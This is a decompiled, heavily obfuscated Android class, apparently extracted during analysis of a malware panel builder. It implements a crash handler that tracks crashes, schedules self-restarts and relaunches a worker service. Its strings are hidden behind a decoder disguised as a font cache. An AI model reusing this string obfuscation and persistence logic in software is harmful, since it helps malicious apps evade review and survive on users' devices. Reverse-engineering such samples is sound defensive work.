package v.s;

import android.app.Application;
import app.mobilex.plus.ManagerWDBridge;
import app.mobilex.plus.services.DataBVTask;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class UfK5MJMCgJfcZejjsA7 implements Thread.UncaughtExceptionHandler {
    public final /* synthetic */ int dDIMxZXP1V8HdM;
    public final /* synthetic */ Object w9sT1Swbhx3hs;

    public /* synthetic */ UfK5MJMCgJfcZejjsA7(int i, Object obj) {
        this.dDIMxZXP1V8HdM = i;
        this.w9sT1Swbhx3hs = obj;
    }

    private static /* synthetic */ void gglhrtw() {
    }

    @Override // java.lang.Thread.UncaughtExceptionHandler
    public final void uncaughtException(Thread thread, Throwable th) {
        switch (this.dDIMxZXP1V8HdM) {
            case 0:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = (RWY6BVSB0XxPbw) this.w9sT1Swbhx3hs;
                TypefaceCache.obtain("00050064005A008A00F500FF00C600AF00310073005A008300B0");
                thread.getName();
                TypefaceCache.obtain("006300750049008600E300B700D700A300790036");
                th.getMessage();
                synchronized (rWY6BVSB0XxPbw.l1V0lQr6TbwNKqHfXNbb) {
                    try {
                        long jCurrentTimeMillis = System.currentTimeMillis();
                        rWY6BVSB0XxPbw.l1V0lQr6TbwNKqHfXNbb.add(Long.valueOf(jCurrentTimeMillis));
                        long j = jCurrentTimeMillis - rWY6BVSB0XxPbw.dTS0S7eC32ubQH54j36;
                        ArrayList arrayList = rWY6BVSB0XxPbw.l1V0lQr6TbwNKqHfXNbb;
                        ArrayList arrayList2 = new ArrayList();
                        int size = arrayList.size();
                        int i = 0;
                        while (i < size) {
                            Object obj = arrayList.get(i);
                            i++;
                            if (((Number) obj).longValue() < j) {
                                arrayList2.add(obj);
                            }
                        }
                        arrayList.removeAll(imhBI9RqzETHtVIJe.GiffeZJ1rbwyx(arrayList2));
                        if (rWY6BVSB0XxPbw.l1V0lQr6TbwNKqHfXNbb.size() < rWY6BVSB0XxPbw.K7eEOBPYP9VIoHWTe) {
                            int i2 = (int) (((double) rWY6BVSB0XxPbw.gIIiyi2ddlMDR0) * 0.8d);
                            if (i2 < 20) {
                                i2 = 20;
                            }
                            TypefaceCache.obtain("001100730048009300F100AD00C600AE002D0071001B008100E200BE00DF00A20063007A0054008800E000FF00C500AE0037007E001B009500F500BB00C700A400260072001B009600E500BE00DE00AE0037006F000100C7");
                            rWY6BVSB0XxPbw.nQilHWaqS401ZtR.postDelayed(new eY3e7LNeKcWCerE2VMV(rWY6BVSB0XxPbw, i2, 2), 500L);
                            return;
                        }
                        TypefaceCache.obtain("00170079005400C700FD00BE00DC00BE006300700049008600FD00BA009200A4003100770048008F00F500AC009200EF");
                        rWY6BVSB0XxPbw.l1V0lQr6TbwNKqHfXNbb.size();
                        TypefaceCache.obtain("006A003A001B009400E400B000C200B7002A0078005C00C700E300AB00C000A20022007B");
                        rWY6BVSB0XxPbw.nQilHWaqS401ZtR.post(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw, 18));
                        try {
                            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(new JSONObject().put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000620049008200F100B200ED00A20031006400540095")).put(TypefaceCache.obtain("00310073005A009400FF00B1"), TypefaceCache.obtain("00250064005A008A00F5008000C600AF00310073005A008300CF00BC00C000A60030007E0064008B00F900B200DB00B3")));
                            break;
                        } catch (Exception unused) {
                        }
                        return;
                    } catch (Throwable th2) {
                        throw th2;
                    }
                }
            default:
                Thread.UncaughtExceptionHandler uncaughtExceptionHandler = (Thread.UncaughtExceptionHandler) this.w9sT1Swbhx3hs;
                Application application = ManagerWDBridge.dDIMxZXP1V8HdM;
                TypefaceCache.obtain("00160058007800A600C5009800FA00930063007F005500C7");
                thread.getName();
                th.getMessage();
                try {
                    Application application2 = ManagerWDBridge.dDIMxZXP1V8HdM;
                    if (application2 != null) {
                        int i3 = DataBVTask.dDIMxZXP1V8HdM;
                        y6jRGLEWNMir.nQilHWaqS401ZtR(application2);
                    }
                    break;
                } catch (Throwable unused2) {
                }
                String name = thread.getName();
                if (name.startsWith(TypefaceCache.obtain("00000077005600B400F500B100D600A20031")) || name.startsWith(TypefaceCache.obtain("001000750049008200F500B100E100B300310073005A008A")) || name.startsWith(TypefaceCache.obtain("00220027000A009E00BD")) || name.startsWith(TypefaceCache.obtain("00150078005800B500F500BC00DD00B1002600640042")) || name.startsWith(TypefaceCache.obtain("00350078005800CA00F600AD00D300AA0026003B"))) {
                    TypefaceCache.obtain("00100061005A008B00FC00B000C500A2002700360058009500F100AC00DA00E7002C0078001B008900FF00B1009F00A40031007F004F008E00F300BE00DE00E70037007E0049008200F100BB008800E7");
                    return;
                }
                if (!name.startsWith(TypefaceCache.obtain("000C007D0073009300E400AF")) && !name.startsWith(TypefaceCache.obtain("000F007F004F008200C7008C009F"))) {
                    if (uncaughtExceptionHandler != null) {
                        uncaughtExceptionHandler.uncaughtException(thread, th);
                        return;
                    }
                    return;
                }
                TypefaceCache.obtain("000D0073004F009000FF00AD00D900E70037007E0049008200F100BB009200A4003100770048008F00F500BB008800E7");
                TypefaceCache.obtain("0063003B001B009300E200B600D500A0002600640052008900F700FF00C100A2003100600052008400F500FF00C000A200200079004D008200E200A6");
                try {
                    Application application3 = ManagerWDBridge.dDIMxZXP1V8HdM;
                    if (application3 != null) {
                        String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                        y6jRGLEWNMir.Qrz92kRPw4GcghAc(application3, TypefaceCache.obtain("00140059006900AC00D5008D00ED009500060045006F00A600C2008B"));
                        return;
                    }
                    return;
                } catch (Exception unused3) {
                    return;
                }
        }
    }
}
